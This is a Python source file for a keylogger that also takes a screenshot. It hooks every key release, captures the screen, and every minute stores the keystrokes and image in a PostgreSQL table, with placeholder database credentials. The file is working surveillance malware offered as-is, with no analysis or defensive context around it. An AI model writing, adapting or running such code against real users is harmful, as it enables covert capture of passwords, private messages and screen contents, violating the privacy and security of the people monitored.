import os
import mss
import keyboard
import time
from threading import Timer, Thread
from datetime import datetime
import logging
import psycopg2
import json

os.chdir(os.path.dirname(os.path.realpath(__file__)))

logging.basicConfig(level=logging.INFO)

SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on

class KeyloggerScreenshot:
    def __init__(self, interval, db_connection_string):
        self.interval = interval
        self.keylog = ""
        self.screenshot = b""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.db_connection_string = db_connection_string

    def keylog_callback(self, event):
        name = event.name
        if len(name) > 1:
            name = f"[{name.upper()}]"
        self.keylog += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        return f"keylog-{start_dt_str}_{end_dt_str}"

    def report(self):
        if self.keylog or self.screenshot:
            self.end_dt = datetime.now()
            filename = self.update_filename()
            self.send_message(filename)
            self.start_dt = datetime.now()
        self.keylog = ""
        self.screenshot = b""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.keylog_callback)
        self.report()
        logging.info("Started keylogger and screenshot sender")
        keyboard.wait()

    def send_message(self, filename):
        try:
            conn = psycopg2.connect(self.db_connection_string)
            cursor = conn.cursor()
            # Check if the table exists, if not, create it
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS computer_data (
                    id SERIAL PRIMARY KEY,
                    filename TEXT,
                    keylog TEXT,
                    screenshot BYTEA
                )
            """)
            conn.commit()
            # Insert data into the table
            cursor.execute("INSERT INTO computer_data (filename, keylog, screenshot) VALUES (%s, %s, %s)",
                           (filename, self.keylog, self.screenshot))
            conn.commit()
            conn.close()
            logging.info("Keylog and screenshot data inserted into the database successfully.")
        except Exception as e:
            logging.error(f"Failed to insert keylog and screenshot data into the database: {e}")

    def capture_screenshot(self):
        try:
            with mss.mss() as sct:
                screenshot_filename = "screenshot.png"
                sct.shot(output=screenshot_filename)

                with open(screenshot_filename, 'rb') as screenshot_file:
                    self.screenshot = screenshot_file.read()

                try:
                    os.remove(screenshot_filename)
                except FileNotFoundError:
                    pass
        except Exception as e:
            logging.error(f"An unexpected error occurred while capturing screenshot: {e}")

if __name__ == "__main__":
    # Update the following variables with your PostgreSQL connection details
    DB_HOST = "localhost"
    DB_NAME = "your_DB_Name"
    DB_USER = "Your_DB_User"
    DB_PASSWORD = "Your_DB_password"

    db_connection_string = f"host={DB_HOST} dbname={DB_NAME} user={DB_USER} password={DB_PASSWORD}"

    keylogger_screenshot = KeyloggerScreenshot(interval=SEND_REPORT_EVERY, db_connection_string=db_connection_string)

    # Start keylogger and screenshot capture in separate threads
    keylogger_screenshot_thread = Thread(target=keylogger_screenshot.start)
    screenshot_thread = Thread(target=keylogger_screenshot.capture_screenshot)

    keylogger_screenshot_thread.start()
    screenshot_thread.start()
